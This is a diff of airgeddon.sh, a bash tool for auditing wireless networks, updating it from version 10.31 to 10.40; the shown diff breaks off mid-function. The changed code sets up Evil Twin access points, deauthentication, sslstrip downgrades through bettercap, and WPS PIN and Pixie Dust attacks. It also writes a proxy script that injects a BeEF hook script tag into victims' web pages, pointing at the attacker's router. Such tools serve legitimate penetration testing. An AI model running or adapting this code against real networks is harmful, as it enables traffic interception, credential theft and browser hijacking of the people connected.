@@ -2,7 +2,7 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Version......: 10.31
+#Version......: 10.40
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
 
@@ -56,7 +56,6 @@ optional_tools_names=(
 						"nft"
 						"ettercap"
 						"etterlog"
-						"sslstrip"
 						"lighttpd"
 						"dnsspoof"
 						"wash"
@@ -107,23 +106,22 @@ declare -A possible_package_names=(
 									[${optional_tools_names[7]}]="nftables" #nft
 									[${optional_tools_names[8]}]="ettercap / ettercap-text-only / ettercap-graphical" #ettercap
 									[${optional_tools_names[9]}]="ettercap / ettercap-text-only / ettercap-graphical" #etterlog
-									[${optional_tools_names[10]}]="sslstrip" #sslstrip
-									[${optional_tools_names[11]}]="lighttpd" #lighttpd
-									[${optional_tools_names[12]}]="dsniff" #dnsspoof
-									[${optional_tools_names[13]}]="reaver" #wash
-									[${optional_tools_names[14]}]="reaver" #reaver
-									[${optional_tools_names[15]}]="bully" #bully
-									[${optional_tools_names[16]}]="pixiewps" #pixiewps
-									[${optional_tools_names[17]}]="bettercap" #bettercap
-									[${optional_tools_names[18]}]="beef-xss / beef-project" #beef
-									[${optional_tools_names[19]}]="aircrack-ng" #packetforge-ng
-									[${optional_tools_names[20]}]="hostapd-wpe" #hostapd-wpe
-									[${optional_tools_names[21]}]="asleap" #asleap
-									[${optional_tools_names[22]}]="john" #john
-									[${optional_tools_names[23]}]="openssl" #openssl
-									[${optional_tools_names[24]}]="hcxtools" #hcxpcapngtool
-									[${optional_tools_names[25]}]="hcxdumptool" #hcxdumptool
-									[${optional_tools_names[26]}]="tshark / wireshark-cli / wireshark" #tshark
+									[${optional_tools_names[10]}]="lighttpd" #lighttpd
+									[${optional_tools_names[11]}]="dsniff" #dnsspoof
+									[${optional_tools_names[12]}]="reaver" #wash
+									[${optional_tools_names[13]}]="reaver" #reaver
+									[${optional_tools_names[14]}]="bully" #bully
+									[${optional_tools_names[15]}]="pixiewps" #pixiewps
+									[${optional_tools_names[16]}]="bettercap" #bettercap
+									[${optional_tools_names[17]}]="beef-xss / beef-project" #beef
+									[${optional_tools_names[18]}]="aircrack-ng" #packetforge-ng
+									[${optional_tools_names[19]}]="hostapd-wpe" #hostapd-wpe
+									[${optional_tools_names[20]}]="asleap" #asleap
+									[${optional_tools_names[21]}]="john" #john
+									[${optional_tools_names[22]}]="openssl" #openssl
+									[${optional_tools_names[23]}]="hcxtools" #hcxpcapngtool
+									[${optional_tools_names[24]}]="hcxdumptool" #hcxdumptool
+									[${optional_tools_names[25]}]="tshark / wireshark-cli / wireshark" #tshark
 									[${update_tools[0]}]="curl" #curl
 								)
 
@@ -133,8 +131,8 @@ declare -A possible_alias_names=(
 								)
 
 #General vars
-airgeddon_version="10.31"
-language_strings_expected_version="10.31-1"
+airgeddon_version="10.40"
+language_strings_expected_version="10.40-1"
 standardhandshake_filename="handshake-01.cap"
 standardpmkid_filename="pmkid_hash.txt"
 standardpmkidcap_filename="pmkid.cap"
@@ -255,14 +253,12 @@ hosts_file="ag.hosts"
 internet_dns1="8.8.8.8"
 internet_dns2="8.8.4.4"
 internet_dns3="139.130.4.5"
-sslstrip_port="10000"
 bettercap_proxy_port="8080"
 bettercap_dns_port="5300"
 minimum_bettercap_advanced_options="1.5.9"
 minimum_bettercap_fixed_beef_iptables_issue="1.6.2"
 bettercap2_version="2.0"
 bettercap2_sslstrip_working_version="2.28"
-sslstrip_file="ag.sslstrip.log"
 ettercap_file="ag.ettercap.log"
 bettercap_file="ag.bettercap.log"
 bettercap_config_file="ag.bettercap.cap"
@@ -1256,6 +1252,7 @@ function integrate_algorithms_pins() {
 }
 
 #Search for target wps bssid mac in pin database and set the vars to be used
+#shellcheck disable=SC2128
 function search_in_pin_database() {
 
 	debug_print
@@ -1267,12 +1264,9 @@ function search_in_pin_database() {
 		if [ "${item}" = "${six_wpsbssid_first_digits_clean}" ]; then
 			bssid_found_in_db=1
 			arrpins=("${PINDB[${item//[[:space:]]/ }]}")
-			for item2 in "${arrpins[@]}"; do
-				counter_pins_found=$((counter_pins_found + 1))
-				pins_found+=("${item2}")
-				fill_wps_data_array "${wps_bssid}" "Database" "${item2}"
-			done
-			break
+			pins_found+=("${arrpins[0]}")
+			counter_pins_found=$(echo "${pins_found[@]}" | wc -w)
+			fill_wps_data_array "${wps_bssid}" "Database" "${pins_found}"
 		fi
 	done
 }
@@ -2360,10 +2354,10 @@ function select_secondary_et_interface() {
 			"et_sniffing")
 				language_strings "${language}" 291 "title"
 			;;
-			"et_sniffing_sslstrip")
+			"et_sniffing_sslstrip2")
 				language_strings "${language}" 292 "title"
 			;;
-			"et_sniffing_sslstrip2")
+			"et_sniffing_sslstrip2_beef")
 				language_strings "${language}" 397 "title"
 			;;
 			"et_captive_portal")
@@ -5229,21 +5223,21 @@ function initialize_menu_options_dependencies() {
 	hashcat_attacks_dependencies=("${optional_tools_names[4]}")
 	et_onlyap_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}")
 	et_sniffing_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[8]}" "${optional_tools_names[9]}")
-	et_sniffing_sslstrip_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[8]}" "${optional_tools_names[9]}" "${optional_tools_names[10]}")
-	et_captive_portal_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[11]}" "${optional_tools_names[12]}")
-	wash_scan_dependencies=("${optional_tools_names[13]}")
-	reaver_attacks_dependencies=("${optional_tools_names[14]}")
-	bully_attacks_dependencies=("${optional_tools_names[15]}")
-	bully_pixie_dust_attack_dependencies=("${optional_tools_names[15]}" "${optional_tools_names[16]}")
-	reaver_pixie_dust_attack_dependencies=("${optional_tools_names[14]}" "${optional_tools_names[16]}")
-	et_sniffing_sslstrip2_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[17]}" "${optional_tools_names[18]}")
-	wep_attack_dependencies=("${optional_tools_names[2]}" "${optional_tools_names[19]}")
-	enterprise_attack_dependencies=("${optional_tools_names[20]}" "${optional_tools_names[21]}" "${optional_tools_names[23]}")
-	asleap_attacks_dependencies=("${optional_tools_names[21]}")
-	john_attacks_dependencies=("${optional_tools_names[22]}")
-	johncrunch_attacks_dependencies=("${optional_tools_names[22]}" "${optional_tools_names[1]}")
-	enterprise_certificates_dependencies=("${optional_tools_names[23]}")
-	pmkid_dependencies=("${optional_tools_names[24]}" "${optional_tools_names[25]}")
+	et_sniffing_sslstrip2_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[16]}")
+	et_captive_portal_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[10]}" "${optional_tools_names[11]}")
+	wash_scan_dependencies=("${optional_tools_names[12]}")
+	reaver_attacks_dependencies=("${optional_tools_names[13]}")
+	bully_attacks_dependencies=("${optional_tools_names[14]}")
+	bully_pixie_dust_attack_dependencies=("${optional_tools_names[14]}" "${optional_tools_names[15]}")
+	reaver_pixie_dust_attack_dependencies=("${optional_tools_names[13]}" "${optional_tools_names[15]}")
+	et_sniffing_sslstrip2_beef_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[16]}" "${optional_tools_names[17]}")
+	wep_attack_dependencies=("${optional_tools_names[2]}" "${optional_tools_names[18]}")
+	enterprise_attack_dependencies=("${optional_tools_names[19]}" "${optional_tools_names[20]}" "${optional_tools_names[22]}")
+	asleap_attacks_dependencies=("${optional_tools_names[20]}")
+	john_attacks_dependencies=("${optional_tools_names[21]}")
+	johncrunch_attacks_dependencies=("${optional_tools_names[21]}" "${optional_tools_names[1]}")
+	enterprise_certificates_dependencies=("${optional_tools_names[22]}")
+	pmkid_dependencies=("${optional_tools_names[23]}" "${optional_tools_names[24]}")
 }
 
 #Set possible changes for some commands that can be found in different ways depending of the O.S.
@@ -5442,7 +5436,6 @@ function clean_tmpfiles() {
 	if [ "${beef_found}" -eq 1 ]; then
 		rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
 	fi
-	rm -rf "${tmpdir}${sslstrip_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${certsdir}" > /dev/null 2>&1
@@ -5468,7 +5461,7 @@ function clean_routing_rules() {
 	debug_print
 
 	if [ -n "${original_routing_state}" ]; then
-		echo "${original_routing_state}" > /proc/sys/net/ipv4/ip_forward
+		echo "${original_routing_state}" > /proc/sys/net/ipv4/ip_forward 2> /dev/null
 	fi
 
 	clean_initialize_iptables_nftables
@@ -5885,7 +5878,7 @@ function evil_twin_attacks_menu() {
 	language_strings "${language}" 256 et_onlyap_dependencies[@]
 	language_strings "${language}" 257 "separator"
 	language_strings "${language}" 259 et_sniffing_dependencies[@]
-	language_strings "${language}" 261 et_sniffing_sslstrip_dependencies[@]
+	language_strings "${language}" 261 et_sniffing_sslstrip2_dependencies[@]
 	language_strings "${language}" 396
 	language_strings "${language}" 262 "separator"
 	language_strings "${language}" 263 et_captive_portal_dependencies[@]
@@ -5944,8 +5937,15 @@ function evil_twin_attacks_menu() {
 			else
 				current_iface_on_messages="${interface}"
 				if check_interface_wifi "${interface}"; then
-					et_mode="et_sniffing_sslstrip"
-					et_dos_menu
+					et_mode="et_sniffing_sslstrip2"
+					get_bettercap_version
+					if compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_version}" && ! compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_sslstrip_working_version}"; then
+						echo
+						language_strings "${language}" 174 "red"
+						language_strings "${language}" 115 "read"
+					else
+						et_dos_menu
+					fi
 				else
 					echo
 					language_strings "${language}" 281 "red"
@@ -6006,15 +6006,15 @@ function beef_pre_menu() {
 	language_strings "${language}" 266
 	print_simple_separator
 
-	if [[ "${beef_found}" -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[18]}]} -eq 1 ]]; then
-		if [[ ${optional_tools[${optional_tools_names[5]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[6]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[7]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[17]}]} -eq 1 ]]; then
+	if [[ "${beef_found}" -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[17]}]} -eq 1 ]]; then
+		if [[ ${optional_tools[${optional_tools_names[5]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[6]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[7]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[16]}]} -eq 1 ]]; then
 			language_strings "${language}" 409 "warning"
 			language_strings "${language}" 416 "pink"
 		else
-			language_strings "${language}" 409 et_sniffing_sslstrip2_dependencies[@]
+			language_strings "${language}" 409 et_sniffing_sslstrip2_beef_dependencies[@]
 		fi
 	else
-		language_strings "${language}" 409 et_sniffing_sslstrip2_dependencies[@]
+		language_strings "${language}" 409 et_sniffing_sslstrip2_beef_dependencies[@]
 	fi
 
 	print_simple_separator
@@ -6032,7 +6032,7 @@ function beef_pre_menu() {
 			else
 				current_iface_on_messages="${interface}"
 				if check_interface_wifi "${interface}"; then
-					et_mode="et_sniffing_sslstrip2"
+					et_mode="et_sniffing_sslstrip2_beef"
 					get_bettercap_version
 					if compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_version}" && ! compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_sslstrip_working_version}"; then
 						echo
@@ -6049,7 +6049,7 @@ function beef_pre_menu() {
 			fi
 		;;
 		2)
-			if [[ "${beef_found}" -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[18]}]} -eq 1 ]]; then
+			if [[ "${beef_found}" -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[17]}]} -eq 1 ]]; then
 				echo
 				language_strings "${language}" 412 "red"
 				language_strings "${language}" 115 "read"
@@ -8618,6 +8618,10 @@ function handle_asleap_attack() {
 
 				if [ ${enterprise_mode} = "noisy" ]; then
 					if [ ${#enterprise_captured_challenges_responses[@]} -eq 1 ]; then
+						for item in "${!enterprise_captured_challenges_responses[@]}"; do
+							enterprise_username="${item}"
+						done
+
 						echo
 						language_strings "${language}" 542 "yellow"
 					else
@@ -8747,8 +8751,8 @@ function exec_et_sniffing_attack() {
 	clean_tmpfiles
 }
 
-#Execute Evil Twin with sniffing+sslstrip attack
-function exec_et_sniffing_sslstrip_attack() {
+#Execute Evil Twin with sniffing+bettercap-sslstrip2 attack
+function exec_et_sniffing_sslstrip2_attack() {
 
 	debug_print
 
@@ -8758,8 +8762,7 @@ function exec_et_sniffing_sslstrip_attack() {
 	set_std_internet_routing_rules
 	launch_dhcp_server
 	exec_et_deauth
-	launch_sslstrip
-	launch_ettercap_sniffing
+	launch_bettercap_sniffing
 	set_et_control_script
 	launch_et_control_window
 
@@ -8773,14 +8776,14 @@ function exec_et_sniffing_sslstrip_attack() {
 		recover_current_channel
 	fi
 	restore_et_interface
-	if [ ${ettercap_log} -eq 1 ]; then
-		parse_ettercap_log
+	if [ ${bettercap_log} -eq 1 ]; then
+		parse_bettercap_log
 	fi
 	clean_tmpfiles
 }
 
 #Execute Evil Twin with sniffing+bettercap-sslstrip2/beef attack
-function exec_et_sniffing_sslstrip2_attack() {
+function exec_et_sniffing_sslstrip2_beef_attack() {
 
 	debug_print
 
@@ -8863,11 +8866,33 @@ function set_bettercap_config() {
 
 	tmpfiles_toclean=1
 	rm -rf "${tmpdir}${bettercap_config_file}" > /dev/null 2>&1
-	rm -rf "${tmpdir}${bettercap_hook_file}" > /dev/null 2>&1
+
+	if [ "${et_mode}" = "et_sniffing_sslstrip2_beef" ]; then
+
+		rm -rf "${tmpdir}${bettercap_hook_file}" > /dev/null 2>&1
+
+		{
+		echo -e "set http.proxy.script ${bettercap_hook_file}"
+		} >> ${tmpdir}${bettercap_config_file}
+
+		{
+		echo -e "function onLoad() {"
+		echo -e "\tlog('BeefInject loaded.');"
+		echo -e "\tlog('targets: ' + env['arp.spoof.targets']);"
+		echo -e "}\n"
+		echo -e "function onResponse(req, res) {"
+		echo -e "\tif (res.ContentType.indexOf('text/html') == 0) {"
+		echo -e "\t\tvar body = res.ReadBody();"
+		echo -e "\t\tif (body.indexOf('</head>') != -1) {"
+		echo -e "\t\t\tres.Body = body.replace('</head>', '<script type=\"text/javascript\" src=\"http://${et_ip_router}:${beef_port}/${jshookfile}\"></script></head>');"
+		echo -e "\t\t}"
+		echo -e "\t}"
+		echo -e "}"
+		} >> ${tmpdir}${bettercap_hook_file}
+	fi
 
 	{
 	echo -e "set http.proxy.port ${bettercap_proxy_port}"
-	echo -e "set http.proxy.script ${bettercap_hook_file}"
 	echo -e "set http.proxy.sslstrip true"
 	echo -e "http.proxy on\n"
 	echo -e "set net.sniff.verbose true"
@@ -8885,21 +8910,6 @@ function set_bettercap_config() {
 	echo -e "events.ignore net.sniff.https\n"
 	echo -e "events.stream on"
 	} >> ${tmpdir}${bettercap_config_file}
-
-	{
-	echo -e "function onLoad() {"
-	echo -e "\tlog('BeefInject loaded.');"
-	echo -e "\tlog('targets: ' + env['arp.spoof.targets']);"
-	echo -e "}\n"
-	echo -e "function onResponse(req, res) {"
-	echo -e "\tif (res.ContentType.indexOf('text/html') == 0) {"
-	echo -e "\t\tvar body = res.ReadBody();"
-	echo -e "\t\tif (body.indexOf('</head>') != -1) {"
-	echo -e "\t\t\tres.Body = body.replace('</head>', '<script type=\"text/javascript\" src=\"http://${et_ip_router}:${beef_port}/${jshookfile}\"></script></head>');"
-	echo -e "\t\t}"
-	echo -e "\t}"
-	echo -e "}"
-	} >> ${tmpdir}${bettercap_hook_file}
 }
 
 #Create configuration file for hostapd
@@ -9018,10 +9028,10 @@ function launch_fake_ap() {
 			"et_onlyap")
 				hostapd_scr_window_position=${g1_topleft_window}
 			;;
-			"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2")
+			"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2_beef")
 				hostapd_scr_window_position=${g3_topleft_window}
 			;;
-			"et_sniffing_sslstrip")
+			"et_sniffing_sslstrip2")
 				hostapd_scr_window_position=${g4_topleft_window}
 			;;
 		esac
@@ -9043,7 +9053,7 @@ function set_dhcp_config() {
 
 	debug_print
 
-	if ! route | grep ${ip_range} > /dev/null; then
+	if ! ip route | grep ${ip_range} > /dev/null; then
 		et_ip_range=${ip_range}
 		et_ip_router=${router_ip}
 		et_broadcast_ip=${broadcast_ip}
@@ -9176,14 +9186,14 @@ function set_std_internet_routing_rules() {
 		else
 			"${iptables_cmd}" -P FORWARD ACCEPT
 		fi
-		echo "1" > /proc/sys/net/ipv4/ip_forward
+		echo "1" > /proc/sys/net/ipv4/ip_forward 2> /dev/null
 	else
 		if [ "${iptables_nftables}" -eq 1 ]; then
 			"${iptables_cmd}" add rule ip filter FORWARD counter drop
 		else
 			"${iptables_cmd}" -P FORWARD DROP
 		fi
-		echo "0" > /proc/sys/net/ipv4/ip_forward
+		echo "0" > /proc/sys/net/ipv4/ip_forward 2> /dev/null
 	fi
 
 	if [ "${et_mode}" = "et_captive_portal" ]; then
@@ -9204,15 +9214,17 @@ function set_std_internet_routing_rules() {
 		else
 			"${iptables_cmd}" -A INPUT -p udp --destination-port 53 -j ACCEPT
 		fi
-	elif [ "${et_mode}" = "et_sniffing_sslstrip" ]; then
-		if [ "${iptables_nftables}" -eq 1 ]; then
-			"${iptables_cmd}" add rule ip nat PREROUTING tcp dport 80 counter redirect to :${sslstrip_port}
-			"${iptables_cmd}" add rule ip filter INPUT tcp dport ${sslstrip_port} counter accept
-		else
-			"${iptables_cmd}" -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port ${sslstrip_port}
-			"${iptables_cmd}" -A INPUT -p tcp --destination-port ${sslstrip_port} -j ACCEPT
-		fi
 	elif [ "${et_mode}" = "et_sniffing_sslstrip2" ]; then
+		if [ "${iptables_nftables}" -eq 1 ]; then
+			"${iptables_cmd}" add rule ip filter INPUT tcp dport ${bettercap_proxy_port} counter accept
+			"${iptables_cmd}" add rule ip filter INPUT udp dport ${bettercap_dns_port} counter accept
+			"${iptables_cmd}" add rule ip filter INPUT iifname "lo" counter accept
+		else
+			"${iptables_cmd}" -A INPUT -p tcp --destination-port ${bettercap_proxy_port} -j ACCEPT
+			"${iptables_cmd}" -A INPUT -p udp --destination-port ${bettercap_dns_port} -j ACCEPT
+			"${iptables_cmd}" -A INPUT -i lo -j ACCEPT
+		fi
+	elif [ "${et_mode}" = "et_sniffing_sslstrip2_beef" ]; then
 		if [ "${iptables_nftables}" -eq 1 ]; then
 			"${iptables_cmd}" add rule ip filter INPUT tcp dport ${bettercap_proxy_port} counter accept
 			"${iptables_cmd}" add rule ip filter INPUT udp dport ${bettercap_dns_port} counter accept
@@ -9256,10 +9268,10 @@ function launch_dhcp_server() {
 		"et_onlyap")
 			dchcpd_scr_window_position=${g1_bottomleft_window}
 		;;
-		"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2")
+		"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2_beef")
 			dchcpd_scr_window_position=${g3_middleleft_window}
 		;;
-		"et_sniffing_sslstrip")
+		"et_sniffing_sslstrip2")
 			dchcpd_scr_window_position=${g4_middleleft_window}
 		;;
 	esac
@@ -9307,10 +9319,10 @@ function exec_et_deauth() {
 			"et_onlyap")
 				deauth_scr_window_position=${g1_bottomright_window}
 			;;
-			"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2")
+			"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2_beef")
 				deauth_scr_window_position=${g3_bottomleft_window}
 			;;
-			"et_sniffing_sslstrip")
+			"et_sniffing_sslstrip2")
 				deauth_scr_window_position=${g4_bottomleft_window}
 			;;
 		esac
@@ -9404,16 +9416,16 @@ function set_wps_attack_script() {
 	cat >&7 <<-EOF
 			"pindb")
 				script_pins_found=(${pins_found[@]})
-				script_attack_cmd1="${unbuffer}timeout -s SIGTERM ${timeout_secs_per_pin} ${attack_cmd1}"
+				script_attack_cmd1="${unbuffer}timeout --foreground -s SIGTERM ${timeout_secs_per_pin} ${attack_cmd1}"
 				pin_header1="${white_color}Testing PIN "
 			;;
 			"custompin")
 				current_pin=${custom_pin}
-				script_attack_cmd1="${unbuffer}timeout -s SIGTERM ${timeout_secs_per_pin} ${attack_cmd1}"
+				script_attack_cmd1="${unbuffer}timeout --foreground -s SIGTERM ${timeout_secs_per_pin} ${attack_cmd1}"
 				pin_header1="${white_color}Testing PIN "
 			;;
 			"pixiedust")
-				script_attack_cmd1="${unbuffer}timeout -s SIGTERM ${timeout_secs_per_pixiedust} ${attack_cmd1}"
+				script_attack_cmd1="${unbuffer}timeout --foreground -s SIGTERM ${timeout_secs_per_pixiedust} ${attack_cmd1}"
 				pin_header1="${white_color}Testing Pixie Dust attack${normal_color}"
 			;;
 			"bruteforce")
@@ -9421,7 +9433,7 @@ function set_wps_attack_script() {
 				pin_header1="${white_color}Testing all possible PINs${normal_color}"
 			;;
 			"nullpin")
-				script_attack_cmd1="${unbuffer}timeout -s SIGTERM ${timeout_secs_per_pin} ${attack_cmd1}"
+				script_attack_cmd1="${unbuffer}timeout --foreground -s SIGTERM ${timeout_secs_per_pin} ${attack_cmd1}"
 				pin_header1="${white_color}Testing null PIN"
 			;;
 		esac
@@ -10202,10 +10214,10 @@ function set_et_control_script() {
 		"et_onlyap")
 			local control_msg=${et_misc_texts[${language},4]}
 		;;
-		"et_sniffing"|"et_sniffing_sslstrip")
+		"et_sniffing"|"et_sniffing_sslstrip2")
 			local control_msg=${et_misc_texts[${language},5]}
 		;;
-		"et_sniffing_sslstrip2")
+		"et_sniffing_sslstrip2_beef")
 			local control_msg=${et_misc_texts[${language},27]}
 		;;
 		"et_captive_portal")
@@ -10333,11 +10345,11 @@ function launch_dns_blackhole() {
 	echo -e "172.217.13.78\tclients4.google.com"
 	} >> "${tmpdir}${hosts_file}"
 
-	manage_output "-hold -bg \"#000000\" -fg \"#0000FF\" -geometry ${g4_middleright_window} -T \"DNS\"" "${optional_tools_names[12]} -i ${interface} -f \"${tmpdir}${hosts_file}\"" "DNS"
+	manage_output "-hold -bg \"#000000\" -fg \"#0000FF\" -geometry ${g4_middleright_window} -T \"DNS\"" "${optional_tools_names[11]} -i ${interface} -f \"${tmpdir}${hosts_file}\"" "DNS"
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
 		et_processes+=($!)
 	else
-		get_tmux_process_id "${optional_tools_names[12]} -i ${interface} -f \"${tmpdir}${hosts_file}\""
+		get_tmux_process_id "${optional_tools_names[11]} -i ${interface} -f \"${tmpdir}${hosts_file}\""
 		et_processes+=("${global_process_pid}")
 		global_process_pid=""
 	fi
@@ -10375,10 +10387,10 @@ function launch_et_control_window() {
 		"et_captive_portal")
 			control_scr_window_position=${g4_topright_window}
 		;;
-		"et_sniffing_sslstrip")
-			control_scr_window_position=${g4_topright_window}
-		;;
 		"et_sniffing_sslstrip2")
+			control_scr_window_position=${g3_topright_window}
+		;;
+		"et_sniffing_sslstrip2_beef")
 			control_scr_window_position=${g4_topright_window}
 		;;
 	esac
@@ -10644,23 +10656,6 @@ function launch_webserver() {
 	fi
 }
 
-#Launch sslstrip for sslstrip sniffing Evil Twin attack
-function launch_sslstrip() {
-
-	debug_print
-
-	rm -rf "${tmpdir}${sslstrip_file}" > /dev/null 2>&1
-	recalculate_windows_sizes
-	manage_output "-hold -bg \"#000000\" -fg \"#0000FF\" -geometry ${g4_middleright_window} -T \"Sslstrip\"" "sslstrip -w \"${tmpdir}${sslstrip_file}\" -p -l ${sslstrip_port} -f -k" "Sslstrip"
-	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
-		et_processes+=($!)
-	else
-		get_tmux_process_id "sslstrip -w \"${tmpdir}${sslstrip_file}\" -p -l ${sslstrip_port} -f -k"
-		et_processes+=("${global_process_pid}")
-		global_process_pid=""
-	fi
-}
-
 #Launch ettercap sniffer
 function launch_ettercap_sniffing() {
 
@@ -10670,9 +10665,6 @@ function launch_ettercap_sniffing() {
 	case ${et_mode} in
 		"et_sniffing")
 			sniffing_scr_window_position=${g3_bottomright_window}
-		;;
-		"et_sniffing_sslstrip")
-			sniffing_scr_window_position=${g4_bottomright_window}
 		;;
 	esac
 	ettercap_cmd="ettercap -i ${interface} -q -T -z -S -u"
@@ -10800,7 +10792,7 @@ function kill_beef() {
 	debug_print
 
 	local beef_pid
-	beef_pid="$(ps -C "${optional_tools_names[18]}" --no-headers -o pid | tr -d ' ')"
+	beef_pid="$(ps -C "${optional_tools_names[17]}" --no-headers -o pid | tr -d ' ')"
 	if ! kill "${beef_pid}" &> /dev/null; then
 		if ! kill "$(ps -C "beef" --no-headers -o pid | tr -d ' ')" &> /dev/null; then
 			kill "$(ps -C "ruby" --no-headers -o pid,cmd | grep "beef" | awk '{print $1}')" &> /dev/null
@@ -10845,7 +10837,7 @@ function prepare_beef_start() {
 	debug_print
 
 	valid_possible_beef_path=0
-	if [[ ${beef_found} -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[18]}]} -eq 0 ]]; then
+	if [[ ${beef_found} -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[17]}]} -eq 0 ]]; then
 		language_strings "${language}" 405 "blue"
 		ask_yesno 191 "yes"
 		if [ "${yesno}" = "y" ]; then
@@ -10862,12 +10854,12 @@ function prepare_beef_start() {
 			language_strings "${language}" 413 "yellow"
 			language_strings "${language}" 115 "read"
 		fi
-	elif [[ "${beef_found}" -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[18]}]} -eq 0 ]]; then
+	elif [[ "${beef_found}" -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[17]}]} -eq 0 ]]; then
 		fix_beef_executable "${beef_path}"
 		echo
 		language_strings "${language}" 413 "yellow"
 		language_strings "${language}" 115 "read"
-	elif [[ "${beef_found}" -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[18]}]} -eq 1 ]]; then
+	elif [[ "${beef_found}" -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[17]}]} -eq 1 ]]; then
 		language_strings "${language}" 405 "blue"
 		ask_yesno 415 "yes"
 		if [ "${yesno}" = "y" ]; then
@@ -10935,7 +10927,7 @@ function fix_beef_executable() {
 	echo -e "./beef"
 	} >> "/usr/bin/beef"
 	chmod +x "/usr/bin/beef" > /dev/null 2>&1
-	optional_tools[${optional_tools_names[18]}]=1
+	optional_tools[${optional_tools_names[17]}]=1
 
 	rewrite_script_with_custom_beef "set" "${1}"
 }
@@ -10963,8 +10955,8 @@ function start_beef_service() {
 
 	debug_print
 
-	if ! service "${optional_tools_names[18]}" restart > /dev/null 2>&1; then
-		systemctl restart "${optional_tools_names[18]}.service" > /dev/null 2>&1
+	if ! service "${optional_tools_names[17]}" restart > /dev/null 2>&1; then
+		systemctl restart "${optional_tools_names[17]}.service" > /dev/null 2>&1
 	fi
 }
 
@@ -10992,7 +10984,7 @@ function launch_beef() {
 			global_process_pid=""
 		fi
 	else
-		manage_output "-hold -bg \"#000000\" -fg \"#00FF00\" -geometry ${g4_middleright_window} -T \"BeEF\"" "${optional_tools_names[18]}" "BeEF"
+		manage_output "-hold -bg \"#000000\" -fg \"#00FF00\" -geometry ${g4_middleright_window} -T \"BeEF\"" "${optional_tools_names[17]}" "BeEF"
 		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 			get_tmux_process_id "{optional_tools_names[18]}"
 			et_processes+=("${global_process_pid}")
@@ -11008,15 +11000,26 @@ function launch_beef() {
 }
 
 #Launch bettercap sniffer
+#shellcheck disable=SC2001
 function launch_bettercap_sniffing() {
 
 	debug_print
 
+	local bettercap_window_title
+
 	recalculate_windows_sizes
-	sniffing_scr_window_position=${g4_bottomright_window}
+	case ${et_mode} in
+		"et_sniffing_sslstrip2")
+			sniffing_scr_window_position=${g3_bottomright_window}
+			bettercap_window_title="Sniffer+Bettercap-Sslstrip2"
+		;;
+		"et_sniffing_sslstrip2_beef")
+			sniffing_scr_window_position=${g4_bottomright_window}
+			bettercap_window_title="Sniffer+Bettercap-Sslstrip2/BeEF"
+		;;
+	esac
 
 	if compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_version}"; then
-
 		set_bettercap_config
 
 		bettercap_cmd="bettercap -iface ${interface} -no-history -caplet ${tmpdir}${bettercap_config_file}"
@@ -11029,16 +11032,22 @@ function launch_bettercap_sniffing() {
 			bettercap_extra_cmd_options="--disable-parsers URL,HTTPS,DHCP --no-http-logs"
 		fi
 
-		bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module injectjs --js-url \"http://${et_ip_router}:${beef_port}/${jshookfile}\" --dns-port ${bettercap_dns_port}"
+		if [ "${et_mode}" = "et_sniffing_sslstrip2" ]; then
+			bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module --dns-port ${bettercap_dns_port}"
+		else
